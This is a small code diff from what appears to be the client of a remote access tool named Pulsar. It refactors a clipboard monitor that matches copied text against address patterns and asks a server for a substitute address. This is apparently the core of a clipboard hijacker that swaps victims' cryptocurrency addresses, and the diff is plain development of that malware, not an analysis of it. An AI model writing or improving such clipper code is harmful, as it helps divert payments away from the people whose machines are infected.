@@ -63,14 +63,16 @@ namespace Pulsar.Client.User
                 {
                     string clipboardText = Clipboard.GetText();
 
-                    foreach (var pattern in _regexPatterns)
-                    {
-                        // If the copied address is already the clipped address, updating the clipboard with the same address will be
-                        // a waste of resources for the server, client and may also cause undefined behavior.
-                        if (pattern.Item2.IsMatch(clipboardText) && !Pulsar.Client.Messages.ClipboardHandler._cachedAddresses.Contains(clipboardText))
+                    // If the copied address is already the clipped address, updating the clipboard with the same address will be
+                    // a waste of resources for both the server and client; it may also cause undefined behavior.
+                    if (!Pulsar.Client.Messages.ClipboardHandler._cachedAddresses.Contains(clipboardText)) {
+                        foreach (var pattern in _regexPatterns)
                         {
-                            _client.Send(new DoGetAddress { Type = pattern.Item1 });
-                            break;
+                            if (pattern.Item2.IsMatch(clipboardText))
+                            {
+                                _client.Send(new DoGetAddress { Type = pattern.Item1 });
+                                break;
+                            }
                         }
                     }
                 }
